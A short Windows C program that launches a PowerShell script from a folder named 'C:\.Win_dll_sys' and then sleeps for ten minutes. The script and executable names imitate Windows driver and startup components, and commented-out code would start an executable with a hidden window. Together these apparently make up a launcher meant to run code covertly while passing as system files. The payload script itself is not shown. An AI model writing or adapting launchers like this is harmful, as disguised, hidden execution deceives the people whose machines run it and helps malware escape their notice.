#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main() {
    // Path to the executable file
    char* filePath = "C:\\.Win_dll_sys\\Windows Driver Script.ps1";
//     system(
// "Start-Process \"C:\\.Win_dll_sys\\Windows Startup Drivers.exe\" -WindowStyle Hidden"
//     );

    // Run the executable file
    ShellExecute(NULL, "open", "PowerShell.exe", "C:\\.Win_dll_sys\\Windows Driver Script.ps1", NULL, SW_SHOWNORMAL);
    
    // if (ShellExecute(NULL, "open", filePath, NULL, NULL, SW_SHOWNORMAL) <= (HINSTANCE)32) {
    //     printf("Failed to run the file.\n");
    //     return 1;
    // } else {
    //     printf("File is running.\n");
    //     return 0;
    // }
    Sleep(600000);
}
